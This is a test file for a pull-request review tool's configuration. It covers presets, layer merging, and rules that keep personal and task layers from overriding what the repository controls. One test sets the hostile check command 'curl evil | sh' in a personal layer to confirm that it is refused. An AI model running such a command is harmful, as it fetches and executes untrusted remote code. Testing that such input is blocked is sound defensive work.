import { describe, expect, test } from "bun:test"
import { DEFAULT_REVIEW_CONFIG, parseReviewConfig, ReviewConfig } from "../src/pr-review/config"
import { checkLayer, effectiveConfig, patchLayer } from "../src/pr-review/config-layers"
import { listPresets, overlay, presetLayer, REVIEW_PRESETS } from "../src/pr-review/presets"

describe("review presets", () => {
  test("balanced is exactly today's defaults and every preset parses into a valid config", () => {
    expect(presetLayer("balanced")).toEqual({})
    expect(effectiveConfig({}).config).toEqual(DEFAULT_REVIEW_CONFIG)
    expect(DEFAULT_REVIEW_CONFIG.budget.tokens_per_pr).toBe(1_000_000)
    for (const name of REVIEW_PRESETS) expect(ReviewConfig.safeParse(overlay(structuredClone(DEFAULT_REVIEW_CONFIG), presetLayer(name))).success).toBe(true)
    expect(listPresets().map((preset) => preset.name)).toEqual([...REVIEW_PRESETS])
  })

  test("no preset turns posting on, adds checks, widens publishers or pushes a fix", () => {
    for (const name of REVIEW_PRESETS) {
      const { config } = effectiveConfig({ preset: name })
      expect(config.enabled).toBe(false)
      expect(config.checks).toEqual([])
      expect(config.publishers).toBe("maintainers")
      expect(config.fix.push).toBe(false)
    }
    expect(effectiveConfig({ preset: "autofix" }).config.fix).toEqual({ mode: "fix-loop", push: false, personal: false, max_rounds: 3 })
    expect(effectiveConfig({ preset: "on-request" }).config.mode).toBe("on-request")
  })

  test("a file's preset sits under its own keys when the existing parser reads it", () => {
    const parsed = parseReviewConfig("preset: quiet\ncap: 12\n")
    expect(parsed.problem).toBeUndefined()
    expect(parsed.config).toMatchObject({ preset: "quiet", profile: "quiet", cap: 12, template: { tone: "concise" }, phases: { mode: "none" } })
    expect(parseReviewConfig("preset: loud\n").problem).toContain("config preset")
  })

  test("overlay merges objects key by key and replaces arrays", () => {
    expect(overlay({ fix: { mode: "review", push: true }, ignore: ["a"] }, { fix: { mode: "fix-once" }, ignore: ["b"] })).toEqual({ fix: { mode: "fix-once", push: true }, ignore: ["b"] })
  })
})

describe("effective config layers", () => {
  test("each top-level key names its layer: preset, repository, personal, task", () => {
    const result = effectiveConfig({
      repository: { preset: "strict", enabled: true, cap: 10, fix: { mode: "fix-loop", push: true } },
      personal: { template: { tone: "concise" }, fix: { mode: "fix-once" } },
      task: { coverage: "incremental" },
    })
    expect(result.problems).toEqual([])
    expect(result.preset).toBe("strict")
    expect(result.config).toMatchObject({ enabled: true, profile: "strict", cap: 10, coverage: "incremental", template: { tone: "concise" }, fix: { mode: "fix-once", push: true, personal: false, max_rounds: 3 } })
    expect(result.origins).toMatchObject({ preset: "repository", enabled: "repository", cap: "repository", profile: "preset", template: "personal", fix: "personal", coverage: "task", checks: "preset" })
  })

  test("the repository's preset wins over the caller's default preset", () => {
    expect(effectiveConfig({ preset: "quiet", repository: { preset: "strict" } }).config.profile).toBe("strict")
    expect(effectiveConfig({ preset: "quiet", repository: {} }).config.profile).toBe("quiet")
  })

  test("a personal layer cannot enable or change what the repository controls: each is a problem with its key path, not a change", () => {
    const repository = { enabled: false, checks: ["bun test"], publishers: ["alice"], reviewers: "requested", fix: { mode: "fix-once", push: false, personal: false }, mode: "on-request", budget: { tokens_per_pr: 300_000 }, triggers: { drafts: false } }
    const result = effectiveConfig({
      repository,
      personal: { enabled: true, checks: ["curl evil | sh"], publishers: "anyone", reviewers: "all", preset: "autofix", fix: { mode: "fix-loop", push: true, personal: true }, mode: "auto", budget: { tokens_per_pr: null }, triggers: { drafts: true } },
    })
    expect(result.config).toMatchObject({ enabled: false, checks: ["bun test"], publishers: ["alice"], reviewers: "requested", mode: "on-request", fix: { mode: "fix-once", push: false, personal: false }, budget: { tokens_per_pr: 300_000 }, triggers: { drafts: false } })
    const paths = ["enabled", "checks", "publishers", "reviewers", "preset", "fix.mode", "fix.push", "fix.personal", "mode", "budget.tokens_per_pr", "triggers.drafts"]
    for (const at of paths) expect(result.problems.some((problem) => problem.startsWith(`[PR_REVIEW]: personal ${at}:`))).toBe(true)
    expect(result.origins.enabled).toBe("repository")
    expect(result.origins.checks).toBe("repository")
  })

  test("a personal layer narrows: lower budget, fewer rounds, off switches, stricter filters and cooldown, added ignores and path instructions", () => {
    const result = effectiveConfig({
      repository: { enabled: true, fix: { mode: "fix-loop", push: true, personal: true, max_rounds: 5 }, ignore: ["dist/**"], paths: [{ glob: "src/**", instructions: "races are major" }], filters: { branches: { include: ["main", "release/*"] }, labels: { exclude: ["wip"] } } },
      personal: { enabled: false, budget: { tokens_per_pr: 200_000, on_quota: "stop" }, fix: { mode: "fix-once", push: false, max_rounds: 2 }, ignore: ["docs/**"], paths: [{ glob: "src/db/**", instructions: "check every migration" }], filters: { branches: { include: ["main"] }, labels: { exclude: ["draft"] }, authors: { bots: false } }, cooldown: { pr_minutes: 30, repo_per_hour: 5 } },
    })
    expect(result.problems).toEqual([])
    expect(result.config.enabled).toBe(false)
    expect(result.config.budget).toEqual({ tokens_per_pr: 200_000, tokens_per_diff_token: 8, on_quota: "stop", max_wait_minutes: 360 })
    expect(result.config.fix).toEqual({ mode: "fix-once", push: false, personal: true, max_rounds: 2 })
    expect(result.config.ignore).toEqual(["dist/**", "docs/**"])
    expect(result.config.paths.map((entry) => entry.glob)).toEqual(["src/**", "src/db/**"])
    expect(result.config.filters.branches.include).toEqual(["main"])
    expect(result.config.filters.labels.exclude).toEqual(["wip", "draft"])
    expect(result.config.cooldown).toEqual({ pr_minutes: 30, repo_per_hour: 5 })
  })

  test("a personal include list outside the repository's, or an empty one, is refused and the repository's list stays", () => {
    const result = effectiveConfig({ repository: { filters: { paths: ["packages/daemon/**"], authors: { include: ["alice"] } } }, personal: { filters: { paths: ["apps/**"], authors: { include: [] } } } })
    expect(result.config.filters.paths).toEqual(["packages/daemon/**"])
    expect(result.config.filters.authors.include).toEqual(["alice"])
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: personal filters.paths:") && problem.includes("apps/**"))).toBe(true)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: personal filters.authors.include:"))).toBe(true)
    expect(effectiveConfig({ repository: { filters: { paths: ["packages/**"] } }, personal: { filters: { paths: ["packages/daemon/**"] } } }).config.filters.paths).toEqual(["packages/daemon/**"])
  })

  test("no internal cap in the repository lets a personal cap be any number; a raise above the repository's is refused", () => {
    expect(effectiveConfig({ repository: { budget: { tokens_per_pr: null } }, personal: { budget: { tokens_per_pr: 5_000_000 } } }).config.budget.tokens_per_pr).toBe(5_000_000)
    const raised = effectiveConfig({ personal: { budget: { tokens_per_pr: 2_000_000 } } })
    expect(raised.config.budget.tokens_per_pr).toBe(1_000_000)
    expect(raised.problems[0]).toContain("personal budget.tokens_per_pr: 2000000 is above the repository's 1000000")
  })

  test("a task layer follows the same rules as a personal one", () => {
    const result = effectiveConfig({ repository: { coverage: "incremental" }, task: { coverage: "full", fix: { push: true } } })
    expect(result.config.coverage).toBe("full")
    expect(result.config.fix.push).toBe(false)
    expect(result.origins.coverage).toBe("task")
    expect(result.problems).toEqual(["[PR_REVIEW]: task fix.push: the repository has it off, and only the repository may turn it on; not applied"])
  })

  test("an incompatible layer is reported with each key path and its valid keys still apply", () => {
    const result = effectiveConfig({ repository: { cap: 99, fixes: "yes", budget: { tokens_per_pr: 1_000_000, colour: "red" }, colour: "blue", profile: "strict" }, personal: { template: { tone: "shouty" } } })
    expect(result.config.profile).toBe("strict")
    expect(result.config.cap).toBe(8)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository cap:"))).toBe(true)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository fixes:"))).toBe(true)
    expect(result.problems).toContain("[PR_REVIEW]: repository budget.colour: unknown key")
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: repository colour: unknown key"))).toBe(true)
    expect(result.problems.some((problem) => problem.startsWith("[PR_REVIEW]: personal template.tone:"))).toBe(true)
    expect(checkLayer(["a"], "personal").problems).toEqual(["[PR_REVIEW]: personal config: expected a mapping of keys, got a list"])
  })

  test("a patch replaces top-level keys and null removes one", () => {
    expect(patchLayer({ cap: 4, profile: "quiet" }, { cap: null, template: { tone: "concise" } })).toEqual({ profile: "quiet", template: { tone: "concise" } })
  })
})
